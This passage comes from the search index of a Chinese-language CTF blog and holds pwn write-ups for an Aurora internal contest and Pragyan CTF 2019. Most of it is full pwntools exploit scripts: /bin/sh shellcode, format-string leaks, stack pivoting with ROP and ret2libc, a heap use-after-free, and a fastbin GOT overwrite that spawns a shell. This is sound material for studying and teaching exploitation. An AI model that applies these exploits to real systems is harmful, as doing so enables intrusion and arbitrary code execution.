WP/Aurora\u5185\u90e8\u8d5bpwn-writeup/#_1","text":"\u663e\u7136\u662f\u8981\u6211\u4eec\u4f20\u5165shellcode\u4ece\u800c\u6267\u884cshellcode\u3002\u8981\u6c42\u957f\u5ea6\u4e3a30\uff0c\u4e14\u4e0d\u80fd\u7528nop\u6307\u4ee4\u586b\u5145\uff0c\u56e0\u6b64\u6700\u597d\u7684\u529e\u6cd5\u662f\u628a\u4e00\u4e9b\u65e0\u5173\u6307\u4ee4\u91cd\u590d\u6267\u884c\u3002\u53c8\u56e0\u4e3axor\u51fd\u6570\u7684\u6821\u9a8c\uff0c\u6211\u4eec\u9700\u8981\u8ba9shellcode\u957f\u5ea6\u4e3a29\uff0c\u6700\u540e\u8fdb\u884c\u8ba1\u7b97\u586b\u5145\u7b2c30\u4f4d\uff0c\u4ece\u800c\u7ed5\u8fc7xor\u7684\u68c0\u67e5\u3002","title":"\u89e3\u9898\u601d\u8def\uff1a"},{"location":"CTF WP/Aurora\u5185\u90e8\u8d5bpwn-writeup/#exp","text":"from pwn import * elf = ELF ( \"break_the_wall\" ) io = elf . process () #io=remote(\"123.207.32.26\",9004) libc = elf . libc #libc=ELF(\"\") #context.log_level='debug' context . bits = 64 sla = io . sendlineafter sl = io . sendline sa = io . sendafter ru = io . recvuntil shell = io . interactive shellcode = asm ( 'xor rsi,rsi' ) shellcode += asm ( 'xor rdx,rdx' ) #execve\u7b2c\u4e8c\u4e2a\u53c2\u6570rsi\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570rdx\u7f6e0 shellcode += asm ( 'xor rax,rax' ) #\u7cfb\u7edf\u8c03\u7528rax\u4f4d\u6e050. shellcode += asm ( 'push rax' ) shellcode += asm ( 'push rax' ) shellcode += asm ( 'push rax' ) #\u586b\u5145\u4f7f\u5f97shellcode\u4e3a29\u4f4d\u3002\u540c\u65f6\u56e0\u4e3arax=0\uff0c\u53ef\u4ee5\u8fbe\u5230\u5bf9'//bin/sh'0\u622a\u65ad\u7684\u6548\u679c shellcode += asm ( 'mov rbx,0x68732f2f6e69622f' ) #'//bin/sh' shellcode += asm ( 'push rbx' ) shellcode += asm ( 'push rsp' ) #rsp\u662f'//bin/sh'\u7684\u5730\u5740 shellcode += asm ( 'pop rdi' ) shellcode += asm ( 'mov al,0x3b' ) shellcode += asm ( 'syscall' ) #execve('//bin/sh',0,0) print len ( shellcode ) #\u53e6\u4e00\u79cd\u5199\u6cd5 ''' shellcode=asm('xor rsi,rsi') shellcode+=asm('xor rdx,rdx') shellcode+=asm('xor rax,rax') shellcode+=asm('push rax') shellcode+=asm('push rax') shellcode+=asm('mov rbx,0x68732f2f6e69622f') shellcode+=asm('push rbx') shellcode+=asm('mov rdi,rsp')#\u53d8\u52a8\u5728\u8fd9\u91cc\uff0c\u76f4\u63a5\u628arsp\u653e\u5230rdi shellcode+=asm('mov al,0x3b') shellcode+=asm('syscall') print len(shellcode) ''' #xor\u6821\u9a8c temp = 0 for i in range ( 15 ): temp ^= ord ( shellcode [ 2 * i ]) temp1 = 0 for i in range ( 14 ): temp ^= ord ( shellcode [ 2 * i + 1 ]) shellcode += chr ( temp ^ temp1 ) print len ( shellcode ) sa ( 'ask? \\n ' , shellcode ) shell () flag: PS\uff1a\u672c\u9898\u539f\u578bDEFCON QUALIFIER 2019 SPEED RUN 003\uff0c\u4e3b\u8981\u662f\u5bf9xor\u51fd\u6570\u505a\u4e86\u5c0f\u6539\u52a8\u3002 PPS\uff1a\u672c\u9898\u5f69\u86cb\uff1a\u300a\u4e09\u4f53\u300b-\u9762\u58c1\u8ba1\u5212","title":"exp:"},{"location":"CTF WP/Aurora\u5185\u90e8\u8d5bpwn-writeup/#baby-stack","text":"","title":"baby stack"},{"location":"CTF WP/Aurora\u5185\u90e8\u8d5bpwn-writeup/#checksec_1","text":"[*] '/home/ljb/ctf/aurora/exam/exam' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled \u53ea\u6709canary\u88ab\u5173\u95ed\uff0c\u5176\u4ed6\u9632\u62a4\u5168\u5f00","title":"checksec\u5206\u6790"},{"location":"CTF WP/Aurora\u5185\u90e8\u8d5bpwn-writeup/#ida-f5","text":"\u4e3b\u8981\u529f\u80fd\uff1a readQuestion\uff0c\u6ca1\u7528\uff0c3\u4e2aputs\u8f93\u51fa\u56fa\u5b9a\u5b57\u7b26\u4e32\u3002 writeAnswer\uff0c\u8bfb\u51650x80\u4e2a\u5b57\u8282\uff0c\u5b58\u57280x10\u4e2a\u5b57\u8282\u6808\u6ea2\u51fa\uff0c\u540c\u65f6\u4f1a\u628a\u8bfb\u5165\u6570\u636e\u590d\u5236\u4e00\u4efd\u5230bss\u6bb5\u4e2d\u7684answersheet\u3002 askTeacher\uff0c\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e takeAnap\uff0csleep\u4e24\u5c0f\u65f6\u3002\u3002\u3002 backdoor\uff0c\u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\uff0c\u9700\u8981\u4f20\u4e00\u4e2a\u53c2\u6570\u3002\u53c2\u6570\u7b49\u4e8e30\uff0c\u4e14\u5168\u5c40\u53d8\u91cfpoint=666\uff0c\u5373\u53ef\u5f97\u5230flag\u3002","title":"IDA F5\u5206\u6790"},{"location":"CTF WP/Aurora\u5185\u90e8\u8d5bpwn-writeup/#_2","text":"\u7531\u4e8e\u5f00\u4e86PIE\uff0c\u56e0\u6b64leak\u9700\u8981\u901a\u8fc7\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3002\u53c8\u7531\u4e8e\u6267\u884cbackdoor\u9700\u8981\u53c2\u6570\uff0c\u56e0\u6b64\u81f3\u5c11\u9700\u89810x20\uff08ebp+pop_rdi+30+backdoor\uff09\u4e2a\u5b57\u8282\u7684\u6808\u6ea2\u51fa\u624d\u80fd\u6784\u9020ROP\u94fe\u3002\u7531\u6b64\u60f3\u5230\u53ef\u4ee5\u901a\u8fc7\u6808\u8fc1\u79fb\u6765\u8fbe\u6210\u3002 \u6808\u8fc1\u79fb\u9996\u5148\u9700\u8981\u627e leave;ret; \u3002\u8fd9\u6b21\u4ece\u9898\u76ee\u6587\u4ef6\u4e2d\u627e\uff0c\u7531\u4e8e\u5f00\u4e86PIE\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981leak\u51faPIE\u3002\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u76f4\u63a5\u6808\u8fc1\u79fb\u5230answersheet\u4e2d\uff0c\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u4f1a\u628aGOT\u8868\u7834\u574f\u6389\u4ece\u800c\u62a5\u9519\u3002\u56e0\u6b64\u6211\u4eec\u8003\u8651\u628a\u6808\u8fc1\u79fb\u5230\u6808\u4e2d\uff0c\u5373writeAnswer\u4e2d\u8bfb\u5165\u6570\u636e\u5b58\u7684\u5730\u65b9\u3002\u6240\u4ee5\u6211\u4eec\u8fd8\u9700\u8981leak\u51fa\u6808\u5730\u5740\u3002 \u4e4b\u540e\u6784\u9020ROP\u94fe\uff0c\u6709\u4e24\u79cd\u65b9\u6cd5\u3002\u4e00\u79cd\u662f\u5148\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6539\u4e86point\u5168\u5c40\u53d8\u91cf\uff0c\u63a5\u7740\u8c03\u7528backdoor\u51fd\u6570\u3002\u53e6\u4e00\u79cd\u662f\u901a\u8fc7ret2libc\uff0c\u5148leak\u51falibc\u51fd\u6570\u7684\u5730\u5740\u518d\u8c03\u7528system('/bin/sh')","title":"\u89e3\u9898\u601d\u8def\uff1a"},{"location":"CTF WP/Aurora\u5185\u90e8\u8d5bpwn-writeup/#exp_1","text":"from pwn import * elf = ELF ( \"exam\" ) #io=elf.process() io = remote ( \"123.207.32.26\" , 9002 ) libc = elf . libc #libc=ELF(\"\") context . log_level = 'debug' sla = io . sendlineafter sl = io . sendline sa = io . sendafter ru = io . recvuntil shell = io . interactive def menu ( choice ): sla ( \"room\" , str ( choice )) def write ( payload ): menu ( 2 ) sa ( \"paper: \\n \" , payload ) sla ( \"[Y/N] \\n \" , 'Y' ) def ask ( payload ): menu ( 3 ) sa ( \"question? \\n \" , payload ) csu_init = 0x15f0 backdoor = 0x11c5 bss = 0x4040 leave_ret = 0x12c5 #ROPgadget --binary exam --only 'leave|ret' pop_rdi = 0x164b #ROPgadget --binary exam --only 'pop|ret'|grep rdi point = 0x4014 #gdb.attach(io) payload = '%24$paaa%13$pbbb%19$pccc%20$pddd' ask ( payload ) ru ( \"is : \" ) #leak PIE csu_init_addr = int ( ru ( \"aaa\" , True ), 16 ) pie = csu_init_addr - csu_init print \"pie:\" + hex ( pie ) #leak libc puts_addr = int ( ru ( \"bbb\" , True ), 16 ) puts_addr = puts_addr - 362 libcbase = puts_addr - libc . sym [ 'puts' ] print \"libcbase:\" + hex ( libcbase ) libc . address = libcbase #leak canary canary = int ( ru ( 'ccc' , True ), 16 ) print 'canary:' + hex ( canary ) #leak stack target = int ( ru ( 'ddd' , True ), 16 ) target -= 0x90 #\u8fd9\u91cc\u9700\u8981gdb\u8c03\u8bd5\u89c2\u5bdf print 'target:' + hex ( target ) #1:stack pivot+ret2libc ''' payload=p64(1) payload+=p64(pie+pop_rdi) payload+=p64(libc.search('/bin/sh').next()) payload+=p64(libc.sym['system']) payload+='\\x90'*(0x68-len(payload)) payload+=p64(canary) payload+=p64(target) payload+=p64(pie+leave_ret) write(payload) shell() ''' ''' #2:fmtstr+stack pivot+backdoor payload='%666c%8$hn' payload+=(16-len(payload))*'a' payload+=p64(pie+point) ask(payload) payload=p64(1) payload+=p64(pie+pop_rdi) payload+=p64(30) payload+=p64(pie+backdoor) payload+='\\x90'*(0x68-len(payload)) payload+=p64(canary) payload+=p64(target) payload+=p64(pie+leave_ret) write(payload) print io.recv() ''' PS\uff1a\u672c\u9898\u539f\u6765\u662f\u5f00\u4e86canary\u9632\u62a4\u7684\uff0c\u540e\u6765\u91cd\u65b0\u7f16\u8bd1\u7684\u65f6\u5019\u5fd8\u8bb0\u4e86\u52a0\uff0c\u56e0\u6b64exp\u4e2d\u8fd8\u6709leak canary\u8fd9\u4e00\u6b65\u3002 PPS\uff1a\u672c\u9898\u5f69\u86cb\uff1a\u6bd4\u8d5b\u7b2c\u4e00\u5929\u662f6\u67088\u53f7\uff0c\u521a\u597d\u662f\u9ad8\u8003\u7b2c\u4e8c\u5929\uff0c\u56e0\u6b64\u9898\u76ee\u4e2d\u7684\u6545\u4e8b\u90fd\u662f\u9ad8\u8003\u80cc\u666f\u3002\u7f05\u6000\u5927\u5bb6\u901d\u53bb\u7684\u9ad8\u4e2d\u9752\u6625\u3002","title":"exp:"},{"location":"CTF WP/Aurora\u5185\u90e8\u8d5bpwn-writeup/#baby-heap","text":"","title":"baby heap"},{"location":"CTF WP/Aurora\u5185\u90e8\u8d5bpwn-writeup/#checksec_2","text":"[*] '/home/ljb/ctf/aurora/double/double' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled \u9664\u4e86RELRO\uff0c\u5176\u4ed6\u5168\u5f00\u3002","title":"checksec\u5206\u6790"},{"location":"CTF WP/Aurora\u5185\u90e8\u8d5bpwn-writeup/#ida-f5_1","text":"\u4e3b\u8981\u529f\u80fd\uff1a add info\uff0c\u7533\u8bf7\u4e00\u4e2a0x10\u5927\u5c0f\u7684\u5806\u3002\u524d8\u5b57\u8282\u5b58message\u5730\u5740\uff0c\u540e8\u5b57\u8282\u5b58puts\u51fd\u6570\u5730\u5740\u3002message\u662f\u6839\u636e\u8f93\u5165\u5927\u5c0fmalloc\u7684\u5806\u3002 del info\uff0c\u5220\u9664info\u3002\u8fd9\u91cc\u662f\u5148\u5220\u9664info\u5806\uff0c\u518d\u5220\u9664\u5bf9\u5e94message\u5806\uff0c\u540c\u65f6\u5b58\u5728UAF\u6f0f\u6d1e\u3002 show info\uff0c\u8f93\u5165info index\u8f93\u51fa\u5bf9\u5e94message\u5b58\u7684\u4fe1\u606f\u3002\u6ce8\u610f\u8fd9\u91cc\u7684\u8f93\u51fa\u8c03\u7528\u7684\u662finfo\u4e2d\u7684puts\u5730\u5740\u3002\u8fd9\u91ccindex\u7ba1\u7406\u5f88\u597d\u4e0d\u5b58\u5728\u6ea2\u51fa\u3002","title":"IDA F5\u5206\u6790"},{"location":"CTF WP/Aurora\u5185\u90e8\u8d5bpwn-writeup/#_3","text":"\u7531\u4e8e\u5b58\u5728UAF\uff0c\u56e0\u6b64\u53ef\u4ee5\u8003\u8651\u5229\u7528fastbin\u7684\u7279\u6027\u3002\u5148leak\u51falibc\uff0c\u7136\u540e\u628aputs\u51fd\u6570\u5730\u5740\u6539\u4e3asystem\u51fd\u6570\u5730\u5740\uff0cmessage\u5199'/bin/sh'\uff0c\u4ece\u800c\u6267\u884csystem('/bin/sh') get shell\u3002","title":"\u89e3\u9898\u601d\u8def\uff1a"},{"location":"CTF WP/Aurora\u5185\u90e8\u8d5bpwn-writeup/#exp_2","text":"from pwn import * elf = ELF ( \"double\" ) #io=elf.process() #io=elf.process(,env={'LD_PRELOAD':'.so'}) io = remote ( \"123.207.32.26\" , 9001 ) libc = elf . libc #libc=ELF(\"\") context . log_level = 'debug' sla = io . sendlineafter sl = io . sendline sa = io . sendafter ru = io . recvuntil shell = io . interactive def menu ( choice ): sla ( \"choice: \\n \" , str ( choice )) def addinfo ( length , message = 'jb' ): menu ( 1 ) sla ( \"length \\n \" , str ( length )) sa ( \"message \\n \" , message ) def delinfo ( index ): menu ( 2 ) sla ( \"delete \\n \" , str ( index )) def showinfo ( index ): menu ( 3 ) sla ( \"watch \\n \" , str ( index )) addinfo ( 0x10 ) #\u7533\u8bf7\u548cinfo\u540c\u6837\u5927\u5c0f\u7684\u5806\uff0c\u4ece\u800c\u4f7f\u5f97message\u548cinfo\u88abfree\u540e\u8fdb\u5165\u540c\u4e00\u4e2afastbin delinfo ( 0 ) addinfo ( 0x10 , 'a' * 8 ) #\u56e0\u4e3a\u4e0a\u9762\u540efree\u7684\u662fmessage\u5806\uff0c\u56e0\u6b64info[1]\u7533\u8bf7\u7684\u662finfo[0]->message\uff0cinfo[1]->message\u7533\u8bf7\u7684\u662finfo[0] showinfo ( 1 ) #\u7531\u4e8einfo[1]->message\u7533\u8bf7\u7684\u662finfo[0]\uff0c\u56e0\u6b64\u540e8\u5b57\u8282\u662fputs\u51fd\u6570\u5730\u5740\uff0c\u4ece\u800cleak libc ru ( 'a' * 8 ) puts_addr = ru ( ' \\n ' , True ) puts_addr = u64 ( puts_addr + ' \\x00\\x00 ' ) libcbase = puts_addr - libc . sym [ 'puts' ] print hex ( libcbase ) libc . address = libcbase addinfo ( 0x10 ) delinfo ( 2 ) addinfo ( 0x10 , p64 ( libc . search ( '/bin/sh' ) . next ()) + p64 ( libc . sym [ 'system' ])) #\u91cd\u65b0\u7533\u8bf7\uff0c\u53c2\u8003\u4e0a\u9762\u7684\u64cd\u4f5c\uff0c\u628ainfo->message\u6539\u4e3a'/bin/sh'\u5730\u5740\uff0cputs\u51fd\u6570\u5730\u5740\u6539\u4e3asystem\u51fd\u6570\u5730\u5740 showinfo ( 2 ) #\u901a\u8fc7show\u529f\u80fd\u89e6\u53d1system\u51fd\u6570 shell () PS\uff1a\u672c\u9898\u9898\u76ee\u8ddf\u56fd\u8d5b\u4e00\u81f4\uff0c\u90fd\u662fdouble\uff0c\u4f46\u5229\u7528\u65b9\u6cd5\u90fd\u4e0d\u662fdouble free\u3002\u672c\u9898flag\u4e3aAurora{n0t_double_free_bu7_double_types_2333}\u3002\u610f\u5728\u8bf4\u660edouble\u5e76\u4e0d\u4e00\u5b9a\u662f\u6307double free\uff0c\u6709\u53ef\u80fd\u662f\u6307\u4e24\u79cd\u5806\u7684\u7c7b\u578bdouble type\uff0c\u4e0d\u8981\u88ab\u60ef\u6027\u601d\u7ef4\u4e86\uff0c\u56e0\u6b64\u8fd9\u9898\u4e5f\u7b97\u7c7b\u578b\u6df7\u6dc6\u7684\u4e00\u79cd\u3002","title":"exp\uff1a"},{"location":"CTF WP/Aurora\u5185\u90e8\u8d5bpwn-writeup/#child-heap","text":"","title":"child heap"},{"location":"CTF WP/Aurora\u5185\u90e8\u8d5bpwn-writeup/#checksec_3","text":"[*] '/home/ljb/ctf/aurora/notebook/notebook' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)","title":"checksec\u5206\u6790"},{"location":"CTF WP/Aurora\u5185\u90e8\u8d5bpwn-writeup/#ida-f5ida","text":"\u4e3b\u8981\u529f\u80fd\uff1a new\uff0c\u6309\u7167\u8f93\u5165\u7684\u5927\u5c0f\u7533\u8bf7\u5806\uff0c\u5728\u5168\u5c40\u6570\u7ec4record\u4e2d\uff0c\u5148\u5b58size\uff0c\u518d\u5b58\u5806\u5730\u5740\u3002\u6ce8\u610f\u9898\u76ee\u4e2d\u5199\u7684read\u51fd\u6570\u9700\u8981\u8f93\u5165\u56de\u8f66\u6765\u7ed3\u675f\uff0c\u5426\u5219\u957f\u5ea6\u4e0d\u591f\u5c31\u4f1a\u76f4\u63a5exit(1)\u3002 edit\uff0c\u5148\u8f93\u5165index\uff0c\u518d\u8f93\u5165\u5927\u5c0f\uff0c\u7136\u540e\u5bf9record\u4e2dindex\u5bf9\u5e94\u7684\u5806\u5185\u5bb9\u8fdb\u884c\u7f16\u8f91\u3002\u8fd9\u91cc\u5bf9\u8f93\u5165\u5927\u5c0f\u4e0d\u68c0\u67e5\uff0c\u56e0\u6b64\u5b58\u5728\u5806\u6ea2\u51fa\u3002 delete\uff0c\u8f93\u5165index\uff0c\u91ca\u653e\u5806\uff0c\u540c\u65f6\u628arecord\u4e2d\u7684size\u548c\u5806\u5730\u5740\u7f6e0\u3002\u8fd9\u91cc\u5b58\u5728\u6570\u7ec4\u8d8a\u754c\u3002 look\uff0c\u8f93\u5165index\uff0c\u67e5\u770b\u5bf9\u5e94\u5806\u4fe1\u606f\u3002\u8fd9\u91cc\u540c\u6837\u5b58\u5728\u6570\u7ec4\u8d8a\u754c\u3002","title":"IDA F5\u5206\u6790\uff08\u672c\u9898IDA\u5206\u6790\u6587\u4ef6\u4e5f\u5728\u94fe\u63a5\u4e2d\uff09"},{"location":"CTF WP/Aurora\u5185\u90e8\u8d5bpwn-writeup/#_4","text":"\u7531\u4e8e\u5b58\u5728\u5806\u6ea2\u51fa\uff0c\u4e14\u5bf9\u7533\u8bf7\u5806\u7684size\u65e0\u9650\u5236\uff0c\u56e0\u6b64\u53ef\u4ee5\u8003\u8651fastbin attack\u4e2d\u7684Arbitrary Alloc\uff0c\u4f2a\u9020\u5806\u5230\u5168\u5c40\u6570\u7ec4record\u4e2d\uff0c\u4ece\u800c\u63a7\u5236record\u7684\u5185\u5bb9\u3002\u7531\u4e8e\u6ca1\u6709\u5f00\u542fFULL RELRO\uff0c\u56e0\u6b64\u53ef\u4ee5\u8003\u8651\u6539GOT\u8868\u3002\u628afree\u6539\u6210system\u4ece\u800cget shell\u3002","title":"\u89e3\u9898\u601d\u8def\uff1a"},{"location":"CTF WP/Aurora\u5185\u90e8\u8d5bpwn-writeup/#exp_3","text":"from pwn import * elf = ELF ( \"notebook\" ) #io=elf.process() #io=elf.process(,env={'LD_PRELOAD':'.so'}) io = remote ( \"123.207.32.26\" , 9003 ) libc = elf . libc #libc=ELF(\"\") context . log_level = 'debug' sla = io . sendlineafter sl = io . sendline sa = io . sendafter ru = io . recvuntil shell = io . interactive def menu ( choice ): sla ( \"your choice? \\n \" , str ( choice )) def new ( size , content = 'jb \\n ' ): menu ( 1 ) sla ( \"notebook: \\n \" , str ( size )) sa ( \"content: \\n \" , content ) def edit ( index , size , content ): menu ( 2 ) sla ( \"notebook: \\n \" , str ( index )) sla ( \"lenth of notebook: \\n \" , str ( size )) io . send ( content ) def delete ( index ): menu ( 3 ) sla ( \"index: \\n \" , str ( index )) def look ( index ): menu ( 4 ) sla ( \"index: \\n \" , str ( index )) #gdb.attach(io) new ( 0x61 ) #0 new ( 0x50 ) #1 delete ( 1 ) #\u6b64\u65f6fastbin\u4e2d\u53ea\u6709\u58061 payload = 'a' * 0x60 #\u586b\u5145\u58060 payload += p64 ( 0 ) + p64 ( 0x61 ) #\u58061\u7684prev_size\u548csize payload += p64 ( 0x6020a0 - 8 ) + ' \\n ' #\u4f2a\u9020\u58061\u7684fd\uff0c\u6307\u5411record-8\uff0c\u6b64\u65f6record[0]->size\u5b58\u7684\u662f0x61\uff0c\u548c\u58061\u7684size\u57df\u76f8\u540c\uff0c\u548c\u58061\u5904\u4e8e\u540c\u4e00\u4e2afastbin edit ( 0 , 0x80 , payload ) new ( 0x50 ) #1\uff0c\u539f\u6765\u7684\u58061 new ( 0x50 ) #2\uff0cfake heap\uff0c\u5806\u5730\u5740\u662f&record[-1]->mesg_addr\uff0cuserdata\u5730\u5740\uff08\u5373malloc\u8fd4\u56de\u7684\u5730\u5740\uff09\u662f&record[0]->mesg_addr new ( 0x10 , '/bin/sh \\x00\\n ' ) #3 payload = p64 ( elf . got [ 'free' ]) edit ( 2 , 0x10 , payload + ' \\n ' ) #\u76f8\u5f53\u4e8e\u6539\u4e86record[0]->mesg_addr\u4e3afree\u7684got\u8868\u5730\u5740 #leak libc look ( 0 ) #\u7531\u4e8erecord[0]->mesg_addr=free@got\uff0c\u56e0\u6b64\u67e5\u770b\u4f1a\u76f4\u63a5\u5f97\u5230free\u7684got\u8868\u5185\u5bb9\u5373free\u5b9e\u9645\u5730\u5740 ru ( \"0:\" ) mesg = ru ( \" \\n \" , True ) free_addr = u64 ( mesg + ' \\x00\\x00 ' ) libcbase = free_addr - libc . sym [ 'free' ] print \"libcbase:\" + hex ( libcbase ) libc . address = libcbase payload = p64 ( libc . sym [ 'system' ])[ 0 : 7 ] edit ( 0 , 0x10 , payload + ' \\n ' ) #\u6539*(record[0]->mesg_addr)\u4e3asystem\u5730\u5740 delete ( 3 ) #\u8c03\u7528system('/bin/sh') shell ()","title":"exp:"},{"location":"CTF WP/pragyan-ctf2019-pwn\u90e8\u5206wp/","text":"\u7b2c\u4e00\u9898 \u00b6 \u6e90\u7a0b\u5e8f\uff1a challenge1 \u5148\u4e22\u8fdbIDA\uff0cF5\uff0c\u5206\u6790\u8fd0\u884c\u8fc7\u7a0b\u3002 \u7a0b\u5e8f\u5148\u751f\u6210\u4e863\u4e2a\u968f\u673a\u6570\u5e76\u8f93\u51fa\uff0c\u7136\u540e\u9700\u8981\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32s\uff1a \u4e4b\u540e\u9a8c\u8bc1s\u4e2d\u662f\u5426\u53ea\u5305\u542b\u6570\u5b57\u5b57\u7b26\u548c\u8d1f\u53f7\uff1a \u7136\u540e\u628as,nptr,v15\u4e2d\u7684\u5b57\u7b26\u4e32\u4f7f\u7528atoi()\u8f6c\u6362\u6210\u6574\u6570v9,v10,v11\uff0c\u5e76\u6ee1\u8db33\u4e2aif\u4e2d\u7684\u6761\u4ef6\u5373\u53ef\u5f97\u5230flag\uff1a \u867d\u7136\u6211\u4eec\u53ea\u8f93\u5165\u4e86\u5b57\u7b26\u4e32s\uff0c\u4f46\u89c2\u5bdf\u53d1\u73b0s,nptr,v15\u662f\u76f8\u8fde\u7684\uff0c\u53ef\u4ee5\u901a\u8fc7\u5199s\u5199\u7a7f\u5230\u5176\u4ed6\u4e24\u4e2a\u53d8\u91cf\u4e2d\uff0c3\u4e2a\u53d8\u91cf\u5927\u5c0f\u90fd\u4e3a10\u5b57\u8282\uff1a \u63a5\u4e0b\u6765\u5c31\u662f\u89e3\u65b9\u7a0b\uff0c\u6c42\u51fav9,v10,v11\uff0c\u7136\u540e\u586b\u5230s\u4e2d\u5e76\u4f20\u8f93\u3002 \u8fd9\u91cc\u6709\u4e2a\u5751\uff0c\u7531\u4e8e\u9700\u8981\u901a\u8fc7s\u76f4\u63a5\u5199\u5230nptr,v15\uff0c\u8fd9\u8bf4\u660e3\u4e2a\u53d8\u91cf\u5b9e\u9645\u4e0a\u662f\u6ca1\u6709\u2018\\0\u2019\u8fd9\u79cd\u5206\u9694\u7b26\u7684\uff0c\u4e00\u65e6\u8c03\u7528atoi(s)\uff0c\u5c31\u4f1a\u628a\u540e\u9762\u7684\u6570\u636e\u4e5f\u8bfb\u53d6\u5230s\u4e2d\u3002\u56e0\u6b64\u8981\u8003\u8651\u600e\u4e48\u5206\u96943\u4e2a\u53d8\u91cf\u3002\u65e2\u7136\u5b83\u9650\u5236\u4e86\u8f93\u5165\u53ea\u80fd\u662f\u6570\u5b57\u5b57\u7b26\u548c\u8d1f\u53f7\uff0c\u6570\u5b57\u663e\u7136\u4e0d\u80fd\u5206\u9694\uff0c\u8fd9\u6837\u53ea\u80fd\u662f\u7528\u8d1f\u53f7\u628a\u5269\u4e0b\u7684\u7a7a\u95f4\u586b\u5145\u3002 exp: from pwn import * def change ( num ): num = str ( num ) return num + ( 10 - len ( num )) * '-' #io=process(\"./challenge1\") io = remote ( \"159.89.166.12\" , 9800 ) io . recvuntil ( \":) \\n \" ) x = io . recvuntil ( \";\" ) x = x [ 0 : len ( x ) - 1 ] y = io . recvuntil ( \";\" ) y = y [ 0 : len ( y ) - 1 ] z = io . recvuntil ( \";\" ) z = z [ 0 : len ( z ) - 1 ] x = int ( x ) y = int ( y ) z = int ( z ) a = ( z - y + x ) / 2 b = ( x + y - z ) / 2 c = ( y - x + z ) / 2 a = change ( a ) b = change ( b ) c = change ( c ) io . sendline ( a + b + c ) io . interactive () \u5f97\u5230flag\uff1a \u7b2c\u4e8c\u9898 \u00b6 \u6e90\u7a0b\u5e8f\uff1a secure_secrets \u53c2\u8003WP WP\u665a\u70b9\u5199 \u7b2c\u4e09\u9898 \u00b6 \u6e90\u7a0b\u5e8f\uff1a armoury","title":"pragyan ctf2019 pwn\u90e8\u5206wp"},{"location":"CTF WP/pragyan-ctf2019-pwn\u90e8\u5206wp/#_1","text":"\u6e90\u7a0b\u5e8f\uff1a challenge1 \u5148\u4e22\u8fdbIDA\uff0cF5\uff0c\u5206\u6790\u8fd0\u884c\u8fc7\u7a0b\u3002 \u7a0b\u5e8f\u5148\u751f\u6210\u4e863\u4e2a\u968f\u673a\u6570\u5e76\u8f93\u51fa\uff0c\u7136\u540e\u9700\u8981\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32s\uff1a \u4e4b\u540e\u9a8c\u8bc1s\u4e2d\u662f\u5426\u53ea\u5305\u542b\u6570\u5b57\u5b57\u7b26\u548c\u8d1f\u53f7\uff1a \u7136\u540e\u628as,nptr,v15\u4e2d\u7684\u5b57\u7b26\u4e32\u4f7f\u7528atoi()\u8f6c\u6362\u6210\u6574\u6570v9,v10,v11\uff0c\u5e76\u6ee1\u8db33\u4e2aif\u4e2d\u7684\u6761\u4ef6\u5373\u53ef\u5f97\u5230flag\uff1a \u867d\u7136\u6211\u4eec\u53ea\u8f93\u5165\u4e86\u5b57\u7b26\u4e32s\uff0c\u4f46\u89c2\u5bdf\u53d1\u73b0s,nptr,v15\u662f\u76f8\u8fde\u7684\uff0c\u53ef\u4ee5\u901a\u8fc7\u5199s\u5199\u7a7f\u5230\u5176\u4ed6\u4e24\u4e2a\u53d8\u91cf\u4e2d\uff0c3\u4e2a\u53d8\u91cf\u5927\u5c0f\u90fd\u4e3a10\u5b57\u8282\uff1a \u63a5\u4e0b\u6765\u5c31\u662f\u89e3\u65b9\u7a0b\uff0c\u6c42\u51fav9,v10,v11\uff0c\u7136\u540e\u586b\u5230s\u4e2d\u5e76\u4f20\u8f93\u3002 \u8fd9\u91cc\u6709\u4e2a\u5751\uff0c\u7531\u4e8e\u9700\u8981\u901a\u8fc7s\u76f4\u63a5\u5199\u5230nptr,v15\uff0c\u8fd9\u8bf4\u660e3\u4e2a\u53d8\u91cf\u5b9e\u9645\u4e0a\u662f\u6ca1\u6709\u2018\\0\u2019\u8fd9\u79cd\u5206\u9694\u7b26\u7684\uff0c\u4e00\u65e6\u8c03\u7528atoi(s)\uff0c\u5c31\u4f1a\u628a\u540e\u9762\u7684\u6570\u636e\u4e5f\u8bfb\u53d6\u5230s\u4e2d\u3002\u56e0\u6b64\u8981\u8003\u8651\u600e\u4e48\u5206\u96943\u4e2a\u53d8\u91cf\u3002\u65e2\u7136\u5b83\u9650\u5236\u4e86\u8f93\u5165\u53ea\u80fd\u662f\u6570\u5b57\u5b57\u7b26\u548c\u8d1f\u53f7\uff0c\u6570\u5b57\u663e\u7136\u4e0d\u80fd\u5206\u9694\uff0c\u8fd9\u6837\u53ea\u80fd\u662f\u7528\u8d1f\u53f7\u628a\u5269\u4e0b\u7684\u7a7a\u95f4\u586b\u5145\u3002 exp: from pwn import * def change ( num ): num = str ( num ) return num + ( 10 - len ( num )) * '-' #io=process(\"./challenge1\") io = remote ( \"159.89.166.12\" , 9800 ) io . recvuntil ( \":) \\n \" ) x = io . recvuntil ( \";\" ) x = x [ 0 : len ( x ) - 1 ] y = io . recvuntil ( \";\" ) y = y [ 0 : len ( y ) - 1 ] z = io . recvuntil ( \";\" ) z = z [ 0 : len ( z ) - 1 ] x = int ( x ) y = int ( y ) z = int ( z ) a = ( z - y + x ) / 2 b = ( x + y - z ) / 2 c = ( y - x + z ) / 2 a = change ( a ) b = change ( b ) c = change ( c ) io . sendline ( a + b + c ) io . interactive () \u5f97\u5230flag\uff1a","title":"\u7b2c\u4e00\u9898"},{"location":"CTF WP/pragyan-ctf2019-pwn\u90e8\u5206wp/#_2","text":"\u6e90\u7a0b\u5e8f\uff1a secure_secrets \u53c2\u8003WP 